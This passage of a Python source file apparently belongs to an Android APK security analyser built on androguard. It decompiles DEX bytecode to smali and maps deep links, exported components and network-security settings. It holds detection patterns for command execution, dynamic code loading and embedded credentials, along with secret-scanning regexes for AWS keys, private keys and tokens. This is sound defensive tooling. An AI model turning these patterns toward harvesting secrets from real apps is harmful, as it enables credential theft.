                        class_smali_lines.append("")
                        
                        # Process fields
                        if hasattr(cls, 'get_fields'):
                            for field in cls.get_fields():
                                field_line = _format_smali_field(field)
                                if field_line:
                                    class_smali_lines.append(field_line)
                        
                        class_smali_lines.append("")
                        
                        # Process methods
                        for method in cls.get_methods():
                            if methods_count >= max_methods:
                                break
                            
                            method_name = method.get_name()
                            method_desc = method.get_descriptor()
                            full_method = f"{readable_class}.{method_name}"
                            
                            # Get method details
                            access_flags = _get_method_access_flags(method)
                            return_type, param_types = _parse_method_descriptor(method_desc)
                            
                            # Check for special methods
                            is_native = 'native' in access_flags.lower()
                            is_abstract = 'abstract' in access_flags.lower()
                            
                            if is_native:
                                result["statistics"]["native_methods"] += 1
                            if is_abstract:
                                result["statistics"]["abstract_methods"] += 1
                            
                            # Get bytecode instructions
                            instructions = []
                            registers_count = 0
                            has_try_catch = False
                            
                            code = method.get_code()
                            if code and not is_native and not is_abstract:
                                registers_count = code.get_registers_size() if hasattr(code, 'get_registers_size') else 0
                                
                                # Get bytecode
                                bc = code.get_bc() if hasattr(code, 'get_bc') else None
                                if bc:
                                    instruction_count = 0
                                    for ins in bc.get_instructions():
                                        if instruction_count >= max_instructions_per_method:
                                            instructions.append(f"    # ... truncated ({instruction_count}+ instructions)")
                                            break
                                        
                                        # Format instruction
                                        ins_name = ins.get_name()
                                        ins_output = ins.get_output() if hasattr(ins, 'get_output') else ""
                                        
                                        if ins_output:
                                            instructions.append(f"    {ins_name} {ins_output}")
                                        else:
                                            instructions.append(f"    {ins_name}")
                                        
                                        instruction_count += 1
                                        result["statistics"]["total_instructions"] += 1
                                
                                # Check for try-catch blocks
                                if hasattr(code, 'get_tries_size') and code.get_tries_size() > 0:
                                    has_try_catch = True
                            
                            # Build method smali
                            method_signature = f"{method_name}{method_desc}"
                            method_smali = _build_smali_method(
                                access_flags, method_name, method_desc,
                                registers_count, instructions, has_try_catch
                            )
                            class_smali_lines.extend(method_smali)
                            class_smali_lines.append("")
                            
                            # Create method record
                            method_record = {
                                "class_name": readable_class,
                                "method_name": method_name,
                                "method_signature": method_signature,
                                "access_flags": access_flags,
                                "return_type": return_type,
                                "parameters": param_types,
                                "registers_count": registers_count,
                                "instructions": instructions,
                                "instruction_count": len(instructions),
                                "has_try_catch": has_try_catch,
                                "is_native": is_native,
                                "is_abstract": is_abstract,
                            }
                            result["decompiled_methods"].append(method_record)
                            
                            # Build search index entry
                            result["search_index"].append({
                                "class": readable_class,
                                "method": method_name,
                                "signature": method_signature,
                                "preview": instructions[0] if instructions else "(empty)",
                            })
                            
                            # Check for interesting patterns
                            instructions_text = ' '.join(instructions).lower()
                            interesting_patterns = [
                                ("invoke-virtual.*crypto", "Cryptographic operation"),
                                ("invoke-static.*cipher", "Cipher usage"),
                                ("invoke-virtual.*reflect", "Reflection"),
                                ("invoke-static.*dexclassloader", "Dynamic DEX loading"),
                                ("invoke-virtual.*runtime.*exec", "Runtime execution"),
                                ("invoke-static.*base64", "Base64 encoding"),
                                ("invoke-virtual.*ssl", "SSL/TLS operation"),
                                ("invoke-static.*processbuilder", "Process execution"),
                                ("const-string.*http", "HTTP URL"),
                                ("const-string.*password", "Password reference"),
                                ("const-string.*api.?key", "API key reference"),
                            ]
                            
                            for pattern, description in interesting_patterns:
                                if re.search(pattern, instructions_text):
                                    result["interesting_methods"].append({
                                        "class": readable_class,
                                        "method": method_name,
                                        "pattern": description,
                                        "preview": instructions[:5] if instructions else [],
                                    })
                                    break
                            
                            methods_count += 1
                            result["statistics"]["total_methods_analyzed"] += 1
                        
                        # Store class smali
                        class_smali_lines.append(".end class")
                        result["class_smali"][readable_class] = '\n'.join(class_smali_lines)
                        
                except Exception as e:
                    logger.warning(f"Failed to decompile DEX {dex_name}: {e}")
                    
    except Exception as e:
        logger.error(f"Smali decompilation failed: {e}")
        result["error"] = str(e)
    
    # Limit interesting methods
    result["interesting_methods"] = result["interesting_methods"][:50]
    result["search_index"] = result["search_index"][:500]  # Limit search index
    
    return result


def _get_access_flags_string(cls_or_method) -> str:
    """Convert access flags to smali format string."""
    flags = []
    
    try:
        access = 0
        if hasattr(cls_or_method, 'get_access_flags'):
            access = cls_or_method.get_access_flags()
        elif hasattr(cls_or_method, 'get_access_flags_string'):
            return cls_or_method.get_access_flags_string()
        
        if access & 0x0001: flags.append("public")
        if access & 0x0002: flags.append("private")
        if access & 0x0004: flags.append("protected")
        if access & 0x0008: flags.append("static")
        if access & 0x0010: flags.append("final")
        if access & 0x0020: flags.append("synchronized")
        if access & 0x0040: flags.append("volatile")  # or bridge for methods
        if access & 0x0080: flags.append("transient")  # or varargs for methods
        if access & 0x0100: flags.append("native")
        if access & 0x0200: flags.append("interface")
        if access & 0x0400: flags.append("abstract")
        if access & 0x0800: flags.append("strict")
        if access & 0x1000: flags.append("synthetic")
        if access & 0x2000: flags.append("annotation")
        if access & 0x4000: flags.append("enum")
        
    except Exception:
        pass
    
    return ' '.join(flags) if flags else "public"


def _get_method_access_flags(method) -> str:
    """Get method access flags as a string."""
    try:
        if hasattr(method, 'get_access_flags_string'):
            return method.get_access_flags_string()
        return _get_access_flags_string(method)
    except:
        return "public"


def _parse_method_descriptor(descriptor: str) -> tuple:
    """Parse method descriptor to get return type and parameter types."""
    try:
        # Format: (params)return
        # e.g., (Ljava/lang/String;I)V -> params: [String, int], return: void
        params_match = re.match(r'\(([^)]*)\)(.+)', descriptor)
        if not params_match:
            return "void", []
        
        params_str, return_str = params_match.groups()
        
        # Parse parameters
        params = []
        i = 0
        while i < len(params_str):
            param_type, consumed = _parse_type(params_str[i:])
            if param_type:
                params.append(param_type)
            i += consumed if consumed > 0 else 1
        
        # Parse return type
        return_type, _ = _parse_type(return_str)
        
        return return_type or "void", params
        
    except Exception:
        return "void", []


def _parse_type(type_str: str) -> tuple:
    """Parse a single type from a descriptor."""
    if not type_str:
        return None, 0
    
    type_map = {
        'V': ('void', 1),
        'Z': ('boolean', 1),
        'B': ('byte', 1),
        'S': ('short', 1),
        'C': ('char', 1),
        'I': ('int', 1),
        'J': ('long', 1),
        'F': ('float', 1),
        'D': ('double', 1),
    }
    
    if type_str[0] in type_map:
        return type_map[type_str[0]]
    
    if type_str[0] == '[':
        inner_type, consumed = _parse_type(type_str[1:])
        return f"{inner_type}[]", consumed + 1
    
    if type_str[0] == 'L':
        end = type_str.find(';')
        if end != -1:
            class_name = type_str[1:end].replace('/', '.')
            return class_name, end + 1
    
    return type_str, 1


def _format_smali_field(field) -> Optional[str]:
    """Format a field definition in smali syntax."""
    try:
        name = field.get_name()
        field_type = field.get_descriptor() if hasattr(field, 'get_descriptor') else "?"
        access = _get_access_flags_string(field)
        
        return f".field {access} {name}:{field_type}"
    except:
        return None


def _build_smali_method(access_flags: str, method_name: str, descriptor: str,
                        registers: int, instructions: List[str], has_try: bool) -> List[str]:
    """Build complete smali method definition."""
    lines = []
    lines.append(f".method {access_flags} {method_name}{descriptor}")
    
    if registers > 0:
        lines.append(f"    .registers {registers}")
    
    lines.append("")
    
    if instructions:
        lines.extend(instructions)
    else:
        lines.append("    # (empty or native method)")
    
    lines.append("")
    lines.append(".end method")
    
    return lines


def analyze_dex_classes_and_methods(apk, file_path: Path) -> Dict[str, Any]:
    """Analyze DEX files for classes, methods, and suspicious patterns."""
    result = {
        "total_classes": 0,
        "total_methods": 0,
        "suspicious_classes": [],
        "suspicious_methods": [],
        "detected_trackers": [],
        "class_hierarchy": [],
        "reflection_usage": [],
        "crypto_usage": [],
        "native_calls": [],
        "dynamic_loading": [],
        "anti_analysis_detected": [],
    }
    
    if not ANDROGUARD_AVAILABLE:
        return result
    
    try:
        from androguard.core.dex import DEX
        
        # Get all DEX files from APK
        with zipfile.ZipFile(file_path, 'r') as zf:
            dex_files = [n for n in zf.namelist() if n.endswith('.dex')]
            
            for dex_name in dex_files:
                try:
                    dex_data = zf.read(dex_name)
                    dex = DEX(dex_data)
                    
                    for cls in dex.get_classes():
                        class_name = cls.get_name()
                        result["total_classes"] += 1
                        
                        # Convert class name format
                        readable_name = class_name.replace('/', '.').strip('L;')
                        
                        # Check for known trackers
                        for tracker_pkg, tracker_name in KNOWN_TRACKERS.items():
                            if tracker_pkg in readable_name:
                                if tracker_name not in result["detected_trackers"]:
                                    result["detected_trackers"].append({
                                        "name": tracker_name,
                                        "package": tracker_pkg,
                                        "class": readable_name,
                                    })
                        
                        # Analyze methods
                        methods = list(cls.get_methods())
                        result["total_methods"] += len(methods)
                        
                        for method in methods[:100]:  # Limit per class
                            method_name = method.get_name()
                            full_method = f"{readable_name}.{method_name}"
                            
                            # Check for suspicious patterns
                            for category, patterns in SUSPICIOUS_DEX_PATTERNS.items():
                                for pattern in patterns:
                                    if pattern.lower() in full_method.lower():
                                        suspicious_entry = {
                                            "class": readable_name,
                                            "method": method_name,
                                            "category": category,
                                            "pattern": pattern,
                                        }
                                        
                                        if category == "reflection":
                                            result["reflection_usage"].append(suspicious_entry)
                                        elif category == "crypto":
                                            result["crypto_usage"].append(suspicious_entry)
                                        elif category == "native":
                                            result["native_calls"].append(suspicious_entry)
                                        elif category == "dynamic_loading":
                                            result["dynamic_loading"].append(suspicious_entry)
                                        elif category == "anti_analysis":
                                            result["anti_analysis_detected"].append(suspicious_entry)
                                        
                                        if suspicious_entry not in result["suspicious_methods"]:
                                            result["suspicious_methods"].append(suspicious_entry)
                        
                        # Build class hierarchy (limited)
                        if len(result["class_hierarchy"]) < 100:
                            superclass = cls.get_superclassname()
                            interfaces = list(cls.get_interfaces()) if hasattr(cls, 'get_interfaces') else []
                            
                            result["class_hierarchy"].append({
                                "name": readable_name,
                                "superclass": superclass.replace('/', '.').strip('L;') if superclass else None,
                                "interfaces": [i.replace('/', '.').strip('L;') for i in interfaces[:5]],
                                "methods_count": len(methods),
                            })
                            
                except Exception as e:
                    logger.warning(f"Failed to analyze DEX {dex_name}: {e}")
                    
    except Exception as e:
        logger.warning(f"DEX analysis failed: {e}")
    
    # Limit results to prevent huge responses
    result["suspicious_methods"] = result["suspicious_methods"][:50]
    result["reflection_usage"] = result["reflection_usage"][:20]
    result["crypto_usage"] = result["crypto_usage"][:20]
    result["native_calls"] = result["native_calls"][:20]
    result["dynamic_loading"] = result["dynamic_loading"][:10]
    result["anti_analysis_detected"] = result["anti_analysis_detected"][:10]
    result["class_hierarchy"] = result["class_hierarchy"][:100]
    
    return result


def analyze_apk_resources(apk, file_path: Path) -> Dict[str, Any]:
    """Analyze APK resources for strings, assets, and potential secrets."""
    result = {
        "string_resources": {},
        "string_count": 0,
        "asset_files": [],
        "raw_resources": [],
        "drawable_count": 0,
        "layout_count": 0,
        "potential_secrets": [],
        "interesting_assets": [],
        "database_files": [],
        "config_files": [],
    }
    
    try:
        with zipfile.ZipFile(file_path, 'r') as zf:
            for name in zf.namelist():
                # Count drawables and layouts
                if name.startswith('res/drawable'):
                    result["drawable_count"] += 1
                elif name.startswith('res/layout'):
                    result["layout_count"] += 1
                
                # Track raw resources
                elif name.startswith('res/raw/'):
                    result["raw_resources"].append(name)
                
                # Track assets
                elif name.startswith('assets/'):
                    asset_name = name[7:]  # Remove 'assets/' prefix
                    result["asset_files"].append(asset_name)
                    
                    # Identify interesting assets
                    lower_name = asset_name.lower()
                    if any(ext in lower_name for ext in ['.db', '.sqlite', '.sqlite3']):
                        result["database_files"].append(asset_name)
                    elif any(ext in lower_name for ext in ['.json', '.xml', '.yml', '.yaml', '.properties', '.conf', '.config']):
                        result["config_files"].append(asset_name)
                        
                        # Try to read config files for secrets
                        try:
                            if zf.getinfo(name).file_size < 100000:  # 100KB limit
                                content = zf.read(name).decode('utf-8', errors='ignore')
                                secrets_found = _scan_content_for_secrets(content, asset_name)
                                result["potential_secrets"].extend(secrets_found)
                        except:
                            pass
                    
                    # Check for embedded APKs or DEX
                    if lower_name.endswith('.apk') or lower_name.endswith('.dex'):
                        result["interesting_assets"].append({
                            "name": asset_name,
                            "type": "embedded_code",
                            "risk": "high",
                        })
        
        # Try to get string resources from androguard
        if ANDROGUARD_AVAILABLE:
            try:
                arsc = apk.get_android_resources()
                if arsc:
                    # Get string resources
                    packages = arsc.get_packages_names()
                    for pkg in packages:
                        try:
                            strings = arsc.get_strings_resources()
                            for locale, string_dict in strings.items():
                                if locale == 'DEFAULT' or locale == '':
                                    for str_name, str_value in list(string_dict.items())[:500]:
                                        result["string_resources"][str_name] = str_value
                                        result["string_count"] += 1
                                        
                                        # Check for secrets in string resources
                                        secrets = _scan_content_for_secrets(str_value, f"strings/{str_name}")
                                        result["potential_secrets"].extend(secrets)
                                    break
                        except Exception as e:
                            logger.debug(f"Error getting strings for package {pkg}: {e}")
            except Exception as e:
                logger.debug(f"Could not get ARSC resources: {e}")
                
    except Exception as e:
        logger.warning(f"Resource analysis failed: {e}")
    
    # Limit results
    result["potential_secrets"] = result["potential_secrets"][:30]
    result["asset_files"] = result["asset_files"][:100]
    result["raw_resources"] = result["raw_resources"][:50]
    
    return result


def _scan_content_for_secrets(content: str, source: str) -> List[Dict[str, Any]]:
    """Scan content for potential secrets."""
    secrets = []
    
    # Secret patterns to look for
    patterns = {
        "api_key": r'(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{16,})["\']?',
        "aws_key": r'(AKIA[A-Z0-9]{16})',
        "google_api": r'AIza[0-9A-Za-z_-]{35}',
        "firebase_url": r'https://[a-z0-9-]+\.firebaseio\.com',
        "private_key": r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----',
        "password_field": r'(?:password|passwd|secret)["\']?\s*[:=]\s*["\']?([^\s"\']{6,})["\']?',
        "bearer_token": r'[Bb]earer\s+[a-zA-Z0-9_\-\.]{20,}',
        "base64_key": r'(?:key|secret|token)["\']?\s*[:=]\s*["\']?([A-Za-z0-9+/]{32,}={0,2})["\']?',
    }
    
    for secret_type, pattern in patterns.items():
        matches = re.findall(pattern, content, re.IGNORECASE)
        for match in matches[:5]:  # Limit matches per type
            value = match if isinstance(match, str) else match[0]
            if len(value) > 6:  # Minimum length
                secrets.append({
                    "type": secret_type,
                    "source": source,
                    "value_preview": value[:20] + "..." if len(value) > 20 else value,
                    "severity": "high" if secret_type in ["private_key", "aws_key"] else "medium",
                })
    
    return secrets


def analyze_intent_filters(apk) -> Dict[str, Any]:
    """Analyze intent filters for deep links and attack surfaces."""
    result = {
        "deep_links": [],
        "browsable_activities": [],
        "exported_components": [],
        "uri_schemes": [],
        "data_handlers": [],
        "implicit_intents": [],
        "attack_surface_summary": {},
    }
    
    if not ANDROGUARD_AVAILABLE:
        return result
    
    try:
        manifest_xml = apk.get_android_manifest_xml()
        if manifest_xml is None:
            return result
        
        ns = '{http://schemas.android.com/apk/res/android}'
        
        # Process each component type
        for component_type in ['activity', 'service', 'receiver', 'provider']:
            components = manifest_xml.findall(f'.//{component_type}')
            
            for comp in components:
                comp_name = comp.get(f'{ns}name', 'unknown')
                is_exported = comp.get(f'{ns}exported', 'false') == 'true'
                
                # Get intent filters
                intent_filters = comp.findall('.//intent-filter')
                
                for intent_filter in intent_filters:
                    filter_info = {
                        "component": comp_name,
                        "component_type": component_type,
                        "actions": [],
                        "categories": [],
                        "data_schemes": [],
                        "data_hosts": [],
                        "data_paths": [],
                        "is_browsable": False,
                        "is_exported": is_exported,
                    }
                    
                    # Get actions
                    for action in intent_filter.findall('.//action'):
                        action_name = action.get(f'{ns}name')
                        if action_name:
                            filter_info["actions"].append(action_name)
                    
                    # Get categories
                    for category in intent_filter.findall('.//category'):
                        cat_name = category.get(f'{ns}name')
                        if cat_name:
                            filter_info["categories"].append(cat_name)
                            if 'BROWSABLE' in cat_name:
                                filter_info["is_browsable"] = True
                    
                    # Get data elements
                    for data in intent_filter.findall('.//data'):
                        scheme = data.get(f'{ns}scheme')
                        host = data.get(f'{ns}host')
                        path = data.get(f'{ns}path')
                        pathPrefix = data.get(f'{ns}pathPrefix')
                        pathPattern = data.get(f'{ns}pathPattern')
                        
                        if scheme:
                            filter_info["data_schemes"].append(scheme)
                            if scheme not in result["uri_schemes"]:
                                result["uri_schemes"].append(scheme)
                        if host:
                            filter_info["data_hosts"].append(host)
                        if path:
                            filter_info["data_paths"].append(path)
                        if pathPrefix:
                            filter_info["data_paths"].append(f"{pathPrefix}*")
                        if pathPattern:
                            filter_info["data_paths"].append(pathPattern)
                    
                    # Build deep links
                    if filter_info["data_schemes"] and filter_info["is_browsable"]:
                        for scheme in filter_info["data_schemes"]:
                            for host in filter_info["data_hosts"] or ['*']:
                                deep_link = f"{scheme}://{host}"
                                if filter_info["data_paths"]:
                                    for path in filter_info["data_paths"]:
                                        result["deep_links"].append({
                                            "url": f"{deep_link}{path}",
                                            "component": comp_name,
                                            "type": component_type,
                                        })
                                else:
                                    result["deep_links"].append({
                                        "url": deep_link,
                                        "component": comp_name,
                                        "type": component_type,
                                    })
                    
                    # Track browsable activities
                    if filter_info["is_browsable"] and component_type == "activity":
                        result["browsable_activities"].append({
                            "name": comp_name,
                            "schemes": filter_info["data_schemes"],
                            "hosts": filter_info["data_hosts"],
                        })
                    
                    # Track implicit intent handlers
                    if filter_info["actions"]:
                        result["implicit_intents"].append(filter_info)
                    
                    # Track exported components with intent filters
                    if is_exported or intent_filters:
                        result["exported_components"].append({
                            "name": comp_name,
                            "type": component_type,
                            "exported": is_exported,
                            "has_intent_filter": bool(intent_filters),
                            "actions": filter_info["actions"],
                        })
        
        # Build attack surface summary
        result["attack_surface_summary"] = {
            "total_deep_links": len(result["deep_links"]),
            "browsable_activities_count": len(result["browsable_activities"]),
            "custom_uri_schemes": [s for s in result["uri_schemes"] if s not in ['http', 'https']],
            "exported_activities": len([c for c in result["exported_components"] if c["type"] == "activity"]),
            "exported_services": len([c for c in result["exported_components"] if c["type"] == "service"]),
            "exported_receivers": len([c for c in result["exported_components"] if c["type"] == "receiver"]),
            "exported_providers": len([c for c in result["exported_components"] if c["type"] == "provider"]),
        }
        
    except Exception as e:
        logger.warning(f"Intent filter analysis failed: {e}")
    
    # Limit results
    result["deep_links"] = result["deep_links"][:50]
    result["implicit_intents"] = result["implicit_intents"][:50]
    result["exported_components"] = result["exported_components"][:50]
    
    return result


def analyze_network_security_config(apk, file_path: Path) -> Dict[str, Any]:
    """Parse and analyze network security configuration."""
    from defusedxml import ElementTree as ET  # Use defusedxml to prevent XXE attacks
    
    result = {
        "has_config": False,
        "cleartext_permitted": True,  # Default for older SDKs
        "cleartext_domains": [],
        "trust_anchors": [],
        "certificate_pins": [],
        "domain_configs": [],
        "security_issues": [],
        "config_xml": None,
    }
    
    try:
        with zipfile.ZipFile(file_path, 'r') as zf:
            # Look for network_security_config.xml in res/xml/
            config_paths = [
                'res/xml/network_security_config.xml',
                'res/xml/network-security-config.xml',
            ]
            
            config_content = None
            for config_path in config_paths:
                if config_path in zf.namelist():
                    try:
                        config_content = zf.read(config_path)
                        result["has_config"] = True
                        break
                    except:
                        pass
            
            if not config_content and ANDROGUARD_AVAILABLE:
                # Try to get from androguard's parsed resources
                try:
                    files = apk.get_files()
                    for f in files:
                        if 'network_security_config' in f.lower() or 'network-security-config' in f.lower():
                            config_content = apk.get_file(f)
                            result["has_config"] = True
                            break
                except:
                    pass
            
            if config_content:
                # Parse the XML
                # Note: In APK, this might be binary XML - try to decode
                try:
                    if ANDROGUARD_AVAILABLE:
                        from androguard.core.axml import AXMLPrinter
                        # Check if it's binary XML
                        if config_content[:4] == b'\x03\x00\x08\x00':
                            axml = AXMLPrinter(config_content)
                            xml_string = axml.get_xml()
                            result["config_xml"] = xml_string
                            root = ET.fromstring(xml_string)
                        else:
                            result["config_xml"] = config_content.decode('utf-8')
                            root = ET.fromstring(config_content)
                    else:
                        result["config_xml"] = config_content.decode('utf-8')
                        root = ET.fromstring(config_content)
                    
                    # Parse base-config
                    base_config = root.find('.//base-config')
                    if base_config is not None:
                        cleartext = base_config.get('cleartextTrafficPermitted', 'true')
                        result["cleartext_permitted"] = cleartext.lower() == 'true'
                        
                        # Get trust anchors
                        for anchor in base_config.findall('.//certificates'):
                            src = anchor.get('src', 'unknown')
                            result["trust_anchors"].append({
                                "source": src,
                                "scope": "base",
                            })
                    
                    # Parse domain-config
                    for domain_config in root.findall('.//domain-config'):
                        cleartext = domain_config.get('cleartextTrafficPermitted', 'false')
                        
                        domains = []
                        for domain in domain_config.findall('.//domain'):
                            include_subdomains = domain.get('includeSubdomains', 'false')
                            domain_name = domain.text or ''
                            domains.append({
                                "name": domain_name,
                                "include_subdomains": include_subdomains.lower() == 'true',
                            })
                            
                            if cleartext.lower() == 'true':
                                result["cleartext_domains"].append(domain_name)
                        
                        # Get pin-set
                        pin_set = domain_config.find('.//pin-set')
                        if pin_set is not None:
                            expiration = pin_set.get('expiration')
                            pins = []
                            for pin in pin_set.findall('.//pin'):
                                digest = pin.get('digest', 'SHA-256')
                                pin_value = pin.text or ''
                                pins.append({
                                    "digest": digest,
                                    "value": pin_value[:20] + "..." if len(pin_value) > 20 else pin_value,
                                })
                            
                            result["certificate_pins"].append({
                                "domains": [d["name"] for d in domains],
                                "expiration": expiration,
                                "pins": pins,
                            })
                        
                        result["domain_configs"].append({
                            "domains": domains,
                            "cleartext_permitted": cleartext.lower() == 'true',
                            "has_pins": pin_set is not None,
                        })
                    
                except Exception as e:
                    logger.warning(f"Failed to parse network security config XML: {e}")
        
        # Analyze for security issues
        if not result["has_config"]:
            result["security_issues"].append(
                "No network_security_config.xml found - cleartext traffic allowed by default on older SDKs"
            )
        
        if result["cleartext_permitted"]:
            result["security_issues"].append(
                "Base config allows cleartext (HTTP) traffic - vulnerable to MITM attacks"
            )
        
        if result["cleartext_domains"]:
            result["security_issues"].append(
                f"Cleartext traffic explicitly allowed for {len(result['cleartext_domains'])} domain(s)"
            )
        
        if not result["certificate_pins"]:
            result["security_issues"].append(
                "No certificate pinning configured - app trusts all valid certificates"
            )
        
        # Check for user-installed certificates trust
        for anchor in result["trust_anchors"]:
            if anchor["source"] == "user":
                result["security_issues"].append(
                    "App trusts user-installed certificates - can be bypassed with custom CA"
                )
                break
                
    except Exception as e:
        logger.warning(f"Network security config analysis failed: {e}")
    
    return result


def _get_exported_components_from_manifest(apk) -> Dict[str, Dict[str, Any]]:
    """
    Parse AndroidManifest.xml to get properly exported components.
    
    A component is exported if:
    1. android:exported="true" explicitly set, OR
    2. For targetSdk < 31: has intent-filters AND android:exported not explicitly "false"
    3. For targetSdk >= 31: must have android:exported explicitly set (implicit export removed)
    
    Also checks for android:permission which can restrict access even if exported.
    
    Returns:
        Dict mapping component_name -> {"is_exported": bool, "has_permission": bool, "permission": str, "has_intent_filters": bool}
    """
    exported_map = {}
    
    try:
        manifest_xml = apk.get_android_manifest_xml()
        if manifest_xml is None:
            return exported_map
        
        ns = '{http://schemas.android.com/apk/res/android}'
        
        # Get target SDK for implicit export rules
        target_sdk = 31  # Default to strict mode
        try:
            target_sdk = int(apk.get_target_sdk_version()) if apk.get_target_sdk_version() else 31
        except:
            pass
        
        for component_type in ['activity', 'service', 'receiver', 'provider']:
            components = manifest_xml.findall(f'.//{component_type}')
            
            for comp in components:
                comp_name = comp.get(f'{ns}name', 'unknown')
                exported_attr = comp.get(f'{ns}exported')  # Could be None, "true", or "false"
                permission_attr = comp.get(f'{ns}permission')
                
                # Check if has intent filters
                intent_filters = comp.findall('.//intent-filter')
                has_intent_filters = len(intent_filters) > 0
                
                # Determine if exported
                if exported_attr == "true":
                    is_exported = True
                elif exported_attr == "false":
                    is_exported = False
                else:
                    # Not explicitly set - apply implicit export rules
                    if target_sdk >= 31:
                        # Android 12+ requires explicit export - default to False
                        is_exported = False
                    else:
                        # Legacy: exported if has intent-filters
                        is_exported = has_intent_filters
                
                # Check for main launcher activity (always accessible)
                is_launcher = False
                for intent_filter in intent_filters:
                    actions = [a.get(f'{ns}name') for a in intent_filter.findall('.//action')]
                    categories = [c.get(f'{ns}name') for c in intent_filter.findall('.//category')]
                    if 'android.intent.action.MAIN' in actions and 'android.intent.category.LAUNCHER' in categories:
                        is_launcher = True
                        is_exported = True  # Launcher must be exported
                        break
                
                exported_map[comp_name] = {
                    "is_exported": is_exported,
                    "has_permission": permission_attr is not None,
                    "permission": permission_attr,
                    "has_intent_filters": has_intent_filters,
                    "is_launcher": is_launcher,
                    "component_type": component_type,
                }
                
    except Exception as e:
        logger.warning(f"Failed to parse exported components from manifest: {e}")
    
    return exported_map


def analyze_apk(file_path: Path) -> ApkAnalysisResult:
    """Analyze an Android APK file using androguard for comprehensive analysis."""
    
    # Use androguard if available for proper analysis
    if ANDROGUARD_AVAILABLE:
        return analyze_apk_with_androguard(file_path)
    else:
        return analyze_apk_basic(file_path)


def analyze_apk_with_androguard(file_path: Path) -> ApkAnalysisResult:
    """Analyze APK using androguard library for comprehensive analysis."""
    try:
        apk = APK(str(file_path))
        
        # Basic info
        package_name = apk.get_package() or "unknown"
        version_name = apk.get_androidversion_name()
        version_code = None
        try:
            vc = apk.get_androidversion_code()
            version_code = int(vc) if vc else None
        except:
            pass
        
        min_sdk = None
        target_sdk = None
        try:
            min_sdk = int(apk.get_min_sdk_version()) if apk.get_min_sdk_version() else None
            target_sdk = int(apk.get_target_sdk_version()) if apk.get_target_sdk_version() else None
        except:
            pass
        
        app_name = apk.get_app_name()
        
        # Permissions
        permissions = []
        for perm in apk.get_permissions():
            is_dangerous = perm in DANGEROUS_PERMISSIONS
            permissions.append(ApkPermission(
                name=perm,
                is_dangerous=is_dangerous,
                description=DANGEROUS_PERMISSIONS.get(perm),
            ))
        
        # Components - use proper manifest parsing for exported status
        components = []
        activities = apk.get_activities() or []
        services = apk.get_services() or []
        receivers = apk.get_receivers() or []
        providers = apk.get_providers() or []
        
        # Get proper exported status from manifest (FIX #6: Don't rely on intent filters alone)
        exported_map = _get_exported_components_from_manifest(apk)
        
        # Check for exported components using PROPER manifest parsing
        for activity in activities:
            export_info = exported_map.get(activity, {})
            is_exported = export_info.get("is_exported", False)
            
            # Get intent filters for display
            intent_filters = []
            filters = apk.get_intent_filters("activity", activity)
            if filters:
                for f in filters:
                    if hasattr(f, 'get_action'):
                        intent_filters.extend(f.get_action() or [])
            
            # Note: _is_main_activity is still used for launcher detection backup
            components.append(ApkComponent(
                name=activity,
                component_type="activity",
                is_exported=is_exported,
                intent_filters=intent_filters[:5],
            ))
        
        for service in services:
            export_info = exported_map.get(service, {})
            is_exported = export_info.get("is_exported", False)
            components.append(ApkComponent(
                name=service,
                component_type="service",
                is_exported=is_exported,
                intent_filters=[],
            ))
        
        for receiver in receivers:
            export_info = exported_map.get(receiver, {})
            is_exported = export_info.get("is_exported", False)
            components.append(ApkComponent(
                name=receiver,
                component_type="receiver",
                is_exported=is_exported,
                intent_filters=[],
            ))
        
        for provider in providers:
            export_info = exported_map.get(provider, {})
            is_exported = export_info.get("is_exported", False)
            components.append(ApkComponent(
                name=provider,
                component_type="provider",
                is_exported=is_exported,
                intent_filters=[],
            ))
        
        # Security flags from manifest
        debuggable = apk.get_effective_target_sdk_version() is not None and _check_debuggable(apk)
        allow_backup = _check_allow_backup(apk)
        
        # Extract certificate info
        certificate = extract_apk_certificate(apk)
        
        # Extract strings from DEX files
        strings = []
        urls = []
        
        with zipfile.ZipFile(file_path, 'r') as zf:
            for name in zf.namelist():
                if name.endswith('.dex'):
                    try:
                        dex_data = zf.read(name)
                        dex_strings = extract_strings(dex_data, min_length=6, max_strings=2000)
                        strings.extend(dex_strings)
                        for s in dex_strings:
                            if s.category == "url":
                                urls.append(s.value)
                    except Exception as e:
                        logger.warning(f"Failed to extract strings from {name}: {e}")
        
        # Detect secrets
        secrets = detect_secrets_in_strings(strings)
        
        # Find native libraries
        native_libs = apk.get_libraries() or []
        
        # Uses features
        uses_features = apk.get_features() or []
        
        # NEW: Run additional analyses
        # 1. DEX class/method analysis
        dex_analysis = analyze_dex_classes_and_methods(apk, file_path)
        
        # 2. Resource analysis
        resource_analysis = analyze_apk_resources(apk, file_path)
        
        # 3. Intent filter / deep link analysis
        intent_filter_analysis = analyze_intent_filters(apk)
        
        # 4. Network security config analysis
        network_config_analysis = analyze_network_security_config(apk, file_path)
        
        # 5. Smali/bytecode decompilation (limited to interesting classes)
        # Focus on main app code, not libraries
        target_classes = None
        if package_name and package_name != "unknown":
            # Target the app's main package and common interesting classes
            target_classes = [package_name.replace('.', '/')]
        smali_analysis = analyze_smali_bytecode(apk, file_path, target_classes=target_classes, max_methods=150)
        
        # Comprehensive security analysis
        security_issues = analyze_apk_security_comprehensive(
            apk=apk,
            package_name=package_name,
            permissions=permissions,
            components=components,
            certificate=certificate,
            strings=strings,
            urls=urls,
            min_sdk=min_sdk,
            target_sdk=target_sdk,
            debuggable=debuggable,
            allow_backup=allow_backup,
        )
        
        # Add security issues from new analyses
        if dex_analysis.get("anti_analysis_detected"):
            security_issues.append({
                "category": "Anti-Analysis",
                "severity": "medium",
                "description": f"App uses {len(dex_analysis['anti_analysis_detected'])} anti-analysis techniques",
                "details": dex_analysis["anti_analysis_detected"][:5],
                "recommendation": "App may be attempting to detect debugging/hooking tools.",
            })
        
        if dex_analysis.get("dynamic_loading"):
            security_issues.append({
                "category": "Dynamic Code Loading",
                "severity": "high",
                "description": f"App uses dynamic class loading ({len(dex_analysis['dynamic_loading'])} instances)",
                "details": dex_analysis["dynamic_loading"][:5],
                "recommendation": "Dynamic code loading can be used to hide malicious behavior.",
            })
        
        if resource_analysis.get("potential_secrets"):
            for secret in resource_analysis["potential_secrets"][:3]:
                security_issues.append({
                    "category": "M2: Secret in Resources",
                    "severity": secret.get("severity", "medium"),
                    "description": f"Potential {secret['type']} found in {secret['source']}",
                    "recommendation": "Remove secrets from APK resources. Use secure storage.",
                })
        
        if intent_filter_analysis.get("deep_links"):
